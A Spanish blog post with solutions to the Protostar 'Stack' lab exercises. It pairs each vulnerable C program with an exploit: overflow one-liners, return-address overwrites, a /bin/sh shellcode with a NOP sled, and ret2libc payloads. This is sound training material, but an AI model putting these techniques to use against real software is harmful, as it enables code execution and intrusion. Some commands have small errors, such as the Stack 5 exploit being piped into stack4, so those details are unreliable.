---
title: "Soluciones de Protostar (Retos Stack)"
date: 2021-08-03T23:33:30-04:05
categories:
  - blog
tags:
  - protostar
  - hacking
  - soluciones
---
En un artículo anterior os explicaba <a href="https://rasp0wn.github.io/blog/como-instalar-protostart-exploiting/">cómo instalar la máquina virtual Protostar</a> para practicar ejercicios de exploiting. Sin embargo, en esta ocasión os traigo las soluciones de Protostar para los ejercicios de la sección «Stack«.

La categoría «Stack» cuenta con una serie de 8 ejercicios (del 0 al 7) y el código fuente podéis encontrarlos <a href="https://exploit.education/protostar/stack-zero/">aquí</a> aunque lo pondré a continuación junto a la solución de cada uno de los ejercicios.

## Soluciones de Protostar: Stack 0

Como en todos los ejercicios, el binario compilado que tendremos que explotar se encuentra en la ruta «/opt/protostar/bin/«. El código fuente es el siguiente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  modified = 0;
  gets(buffer);

  if(modified != 0) {
      printf("you have changed the 'modified' variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

Y la solución se muestra a continuación:

```
python -c "print('A'*64 + 'B')" | ./stack0
```

## Soluciones de Protostar: Stack 1
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];

  if(argc == 1) {
      errx(1, "please specify an argument\n");
  }

  modified = 0;
  strcpy(buffer, argv[1]);

  if(modified == 0x61626364) {
      printf("you have correctly got the variable to the right value\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }
}
```

Solución:

```
./stack1 $(python -c "print('A'*64 + '\x64\x63\x62\x61')")
```

## Stack 2
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

Solución:

```
export GREENIE=$(python -c "print('A'*64 + '\x0a\x0d\x0a\x0d')")
./stack2
```

## Stack 3
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```
En cuanto a la solución, creamos primero un archivo llamado «exploit.py» con el siguiente contenido:

```
import struct 

win_dir = 0x08048424
junk = 'A'*64

payload = junk + struct.pack('i', win_dir)
print(payload)
```

Como consejo, para saber la dirección exacta del método «win» podemos utilizar un debugger como GDB:

```
gdb stack3
disas win #Mirar la primera línea donde está la dirección del método
```

Finalmente, ejecutamos nuestro exploit:

```
python exploit.py | /opt/protostar/bin/stack3`
```

## Stack 4
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

GDB:

```
disas main
b *0x0804841e    # Breakpoint en el ret

info registers   # Comprobamos que estamos en el ret
x/30wx $esp-0x20 # Vemos lo que hemos sobreescrito y cuánto nos queda
x/wx $esp        # Dirección a la que apunta el ret, la que hay que cambiar

disas win        # Vemos la dirección de win = 0x080483f4
```
Exploit:

```
python -c "print('A'*76 + '\xf4\x83\x04\x08')" | /opt/protostar/bin/stack4
```

## Stack 5
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
En este reto en lugar de hacer que se ejecute un método incluido en el propio programa, lo que tenemos que conseguir es ejecutar una shell.

Por ello, se especifica a continuación un shellcode que podemos utilizar:

```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80
```
GDB:

```
disas main
breakpoint en el ret

# Mirar en qué dirección estás escribiendo el bof, modificar el eip y ahí poner un NOP slide
# con la shell
```
Y finalmente el exploit en Python:

```
import struct

shellcode = '\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
ret_address = '\xbc\xf7\xff\xbf' 

buffer = 'A'*76
nops = '\x90'*100

payload = buffer + ret_address + nops + shellcode

print(payload)
```

```
python exploit.py | /opt/protostar/bin/stack4
```

## Stack 6
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
    printf("bzzzt (%p)\n", ret);
    _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```

GDB:

```
find 0xb7e97000, +9999999, "/bin/sh" # Para encontrar la cadena "/bin/sh"
```
El exploit en Python:

```
import struct

libc_base_address = 0xb7e97000

system_offset = 0x038fb0 
exit_offset = 0x0002f0c0 
binsh_offset = 0x11f3bf

system_dir = struct.pack("I", system_offset + libc_base_address)
exit_dir = struct.pack("I", exit_offset + libc_base_address)
binsh_dir = struct.pack("I", binsh_offset + libc_base_address )


junk = 'A'*80

payload = junk + system_dir + exit_dir + binsh_dir

print payload
```
Finalmente, para ejecutar el exploit vamos a utilizar un pequeño truco con «cat» para que la salida del programa no finalice inmediatamente:

```
(python exploit.py; cat) | /opt/protostar/bin/stack6
```

## Stack 7
Código fuente:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

char *getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);

  gets(buffer);

  ret = __builtin_return_address(0);

  if((ret & 0xb0000000) == 0xb0000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
  return strdup(buffer);
}

int main(int argc, char **argv)
{
  getpath();


}
```

El exploit en Python:

```
import struct

libc_base_address = 0xb7e97000

system_offset = 0x038fb0 
exit_offset = 0x0002f0c0 
binsh_offset = 0x11f3bf

system_dir = struct.pack("I", system_offset + libc_base_address)
exit_dir = struct.pack("I", exit_offset + libc_base_address)
binsh_dir = struct.pack("I", libc_base_address + binsh_offset)
ret_dir = struct.pack("I", 0x08048544)


junk = 'A'*80

payload = junk + ret_dir + system_dir + exit_dir + binsh_dir

print payload
```

